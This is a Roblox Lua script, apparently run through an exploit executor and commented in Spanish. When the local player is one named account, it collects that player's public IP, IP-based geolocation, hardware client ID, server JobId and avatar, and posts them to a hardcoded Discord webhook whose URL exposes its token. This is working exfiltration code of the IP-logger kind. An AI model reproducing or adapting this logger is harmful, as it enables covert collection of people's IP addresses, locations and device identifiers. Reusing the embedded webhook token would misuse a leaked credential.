local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local discordWebhookUrl = "https://discord.com/api/webhooks/1344860193409863722/bK7aRp2l6FeTrZfHuvzaGFsHRD1f4EVhUgNpAlZDo6nzo1CUPC7K_hTb0_AoQJ12MIm3"
local lplr = Players.LocalPlayer

if lplr.Name ~= "iLordYamoshi666" then
    print("Este no es el jugador permitido") -- Mensaje en la consola
    return -- Detiene la ejecución del script
end

-- Obtener IP y otros datos
local ip = game:HttpGet("https://v4.ident.me/")
local data = game:HttpGet("http://ip-api.com/json")
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

local function getAvatarUrl(userId)
    local url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png"
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)

    if success then
        local data = HttpService:JSONDecode(response)
        if data.data and #data.data > 0 then
            return data.data[1].imageUrl
        end
    end
    return nil
end

local function sendAvatarToDiscord(player)
    local userId = player.UserId
    local avatarUrl = getAvatarUrl(userId)

    if avatarUrl then
        local dataToSend = {
            ["embeds"] = {
                {
                    ["title"] = "Información del Jugador",
                    ["color"] = 0x00ff00,
                    ["description"] = "El jugador 'iLordYamoshi666' ha ejecutado el script.",
                    ["fields"] = {
                        {["name"] = "Usuario", ["value"] = player.Name, ["inline"] = true},
                        {["name"] = "Apodo", ["value"] = player.DisplayName, ["inline"] = true},
                        {["name"] = "UserID", ["value"] = tostring(userId), ["inline"] = false},
                        {["name"] = "JobId", ["value"] = game.JobId, ["inline"] = false},
                        {["name"] = "HWID", ["value"] = hwid, ["inline"] = false},
                        {["name"] = "IP", ["value"] = ip, ["inline"] = false},
                        {["name"] = "Data", ["value"] = data, ["inline"] = false}
                    },
                    ["thumbnail"] = {
                        ["url"] = avatarUrl
                    }
                }
            }
        }

        local success, response = pcall(function()
            return http_request({
                Url = discordWebhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(dataToSend)
            })
        end)

        if not success then
            warn("Error al enviar los datos a Discord:", response)
        end
    else
        warn("No se pudo obtener la URL del avatar.")
    end
end

-- Enviar la información solo si el jugador es "iLordYamoshi666"
sendAvatarToDiscord(lplr)
